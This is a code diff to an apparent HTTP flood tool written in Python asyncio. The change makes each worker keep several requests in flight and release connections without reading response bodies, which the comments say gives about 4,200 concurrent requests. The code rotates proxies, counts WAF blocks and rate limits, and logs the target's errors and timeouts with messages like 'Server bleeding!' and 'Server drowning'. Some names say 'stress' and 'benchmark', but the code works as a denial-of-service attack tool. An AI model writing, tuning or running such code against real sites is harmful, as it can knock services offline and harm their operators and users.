@@ -2107,13 +2107,100 @@ async def adaptive_attack(worker_func, target_url, initial_concurrency,
 
 async def stress_worker(direct_session, target_url, duration, stats,
                         use_proxy=False, safe_state=None, rps_limiter=None):
+    """
+    High-throughput worker: fires multiple concurrent in-flight requests.
+    Doesn't wait for each response before sending the next one.
+    """
     start_time = time.time()
+
+    # Concurrent in-flight requests per worker.
+    # Total in-flight = MAX_PENDING × number of workers.
+    # With 840 workers × 5 = ~4,200 in-flight requests.
+    MAX_PENDING = 5
+
+    async def _single_request(session, url, headers, ssl_param, proxy_key, tag):
+        req_start = time.perf_counter()
+        try:
+            # Do NOT use async-with: we want to close immediately after
+            # reading the status line, without waiting for the body.
+            response = await session.get(
+                url, headers=headers,
+                timeout=aiohttp.ClientTimeout(total=5, connect=2, sock_read=4),
+                ssl=ssl_param,
+                allow_redirects=False,
+            )
+            latency = int((time.perf_counter() - req_start) * 1000)
+            status = response.status
+
+            # Release connection back to pool WITHOUT reading body.
+            # This is the KEY optimization — no waiting for body transfer.
+            response.release()
+
+            stats["requests"] += 1
+            if status == 200:
+                stats["success"] += 1
+                if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
+                log_event("200", f"Target hit!  Latency: {Colors.BOLD}{latency:>4}ms{Colors.RESET}{tag}")
+            elif status == 403:
+                stats["blocked"] += 1
+                if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
+                log_event("403", f"Blocked by WAF!  Latency: {latency}ms{tag}")
+            elif status == 429:
+                stats["rate_limit"] += 1
+                if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
+                log_event("429", f"Rate limit triggered.  Latency: {latency}ms{tag}")
+            elif status in ORIGIN_ERROR_CODES:
+                stats["server_error"] += 1
+                if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
+                log_event(str(status), f"Server bleeding!  Latency: {latency}ms{tag}")
+                if safe_state is not None and safe_state.enabled:
+                    if safe_state.trigger(status):
+                        if LIVE_DASHBOARD.enabled:
+                            LIVE_DASHBOARD.add_event("Safe-Mode · Triggered")
+                        else:
+                            print(f"  {Colors.YELLOW}{Colors.BOLD}● SAFE-MODE{Colors.RESET}  "
+                                  f"origin error {Colors.RED}{status}{Colors.RESET} detected  "
+                                  f"{Colors.DIM}→{Colors.RESET}  pausing attack & monitoring")
+            elif 500 <= status <= 599:
+                stats["server_error"] += 1
+                if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
+                log_event(str(status), f"Server error!  Latency: {latency}ms{tag}")
+            else:
+                stats["other"] += 1
+                if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
+                log_event("OTHER", f"Status {status}.  Latency: {latency}ms{tag}")
+        except asyncio.TimeoutError:
+            stats["timeouts"] += 1
+            if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
+            log_event("TIMEOUT", f"Server drowning, timeout!{tag}")
+        except asyncio.CancelledError:
+            raise
+        except Exception as e:
+            stats["dropped"] += 1
+            if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
+            err_msg = str(e)[:80] if str(e) else type(e).__name__
+            log_event("FAIL", f"{type(e).__name__}: {err_msg}{tag}")
+
+    pending = set()
+
     while time.time() - start_time < duration:
         if _INTERRUPTED[0]:
             break
         if safe_state is not None and safe_state.enabled and safe_state.active:
             await asyncio.sleep(1)
             continue
+
+        # Drain completed tasks (non-blocking)
+        if pending:
+            done, pending = await asyncio.wait(
+                pending, timeout=0, return_when=asyncio.FIRST_COMPLETED
+            )
+
+        # Backpressure: wait if too many in-flight
+        while len(pending) >= MAX_PENDING:
+            done, pending = await asyncio.wait(
+                pending, return_when=asyncio.FIRST_COMPLETED
+            )
 
         if rps_limiter is not None:
             await rps_limiter.wait()
@@ -2151,58 +2238,24 @@ async def stress_worker(direct_session, target_url, duration, stats,
         else:
             tag = f"  {Colors.DIM}[via DIRECT]{Colors.RESET}"
 
-        req_start = time.perf_counter()
-        stats["requests"] += 1
+        ssl_param = PROXY_SSL_CTX if use_ssl_ctx else False
+
+        t = asyncio.create_task(
+            _single_request(session, url, headers, ssl_param, proxy_key, tag)
+        )
+        pending.add(t)
+
+    # Drain any remaining in-flight tasks
+    if pending:
         try:
-            ssl_param = PROXY_SSL_CTX if use_ssl_ctx else False
-            async with session.get(url, headers=headers,
-                                   timeout=aiohttp.ClientTimeout(total=8),
-                                   ssl=ssl_param) as response:
-                latency = int((time.perf_counter() - req_start) * 1000)
-                status = response.status
-                if status == 200:
-                    stats["success"] += 1
-                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
-                    log_event("200", f"Target hit!  Latency: {Colors.BOLD}{latency:>4}ms{Colors.RESET}{tag}")
-                elif status == 403:
-                    stats["blocked"] += 1
-                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
-                    log_event("403", f"Blocked by WAF!  Latency: {latency}ms{tag}")
-                elif status == 429:
-                    stats["rate_limit"] += 1
-                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
-                    log_event("429", f"Rate limit triggered.  Latency: {latency}ms{tag}")
-                elif status in ORIGIN_ERROR_CODES:
-                    stats["server_error"] += 1
-                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
-                    log_event(str(status), f"Server bleeding!  Latency: {latency}ms{tag}")
-                    if safe_state is not None and safe_state.enabled:
-                        if safe_state.trigger(status):
-                            if LIVE_DASHBOARD.enabled:
-                                LIVE_DASHBOARD.add_event("Safe-Mode · Triggered")
-                            else:
-                                print(f"  {Colors.YELLOW}{Colors.BOLD}● SAFE-MODE{Colors.RESET}  "
-                                      f"origin error {Colors.RED}{status}{Colors.RESET} detected  "
-                                      f"{Colors.DIM}→{Colors.RESET}  pausing attack & monitoring")
-                elif 500 <= status <= 599:
-                    stats["server_error"] += 1
-                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
-                    log_event(str(status), f"Server error!  Latency: {latency}ms{tag}")
-                else:
-                    stats["other"] += 1
-                    if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
-                    log_event("OTHER", f"Status {status}.  Latency: {latency}ms{tag}")
-        except asyncio.TimeoutError:
-            stats["timeouts"] += 1
-            if proxy_key: PROXY_MANAGER.record_request(proxy_key, True)
-            log_event("TIMEOUT", f"Server drowning, timeout!{tag}")
-        except asyncio.CancelledError:
-            raise
-        except Exception as e:
-            stats["dropped"] += 1
-            if proxy_key: PROXY_MANAGER.record_request(proxy_key, False)
-            err_msg = str(e)[:80] if str(e) else type(e).__name__
-            log_event("FAIL", f"{type(e).__name__}: {err_msg}{tag}")
+            await asyncio.wait_for(
+                asyncio.gather(*pending, return_exceptions=True),
+                timeout=5
+            )
+        except Exception:
+            for t in pending:
+                if not t.done():
+                    t.cancel()
 
 
 async def run_benchmark(target_url, concurrency, duration, use_proxy,
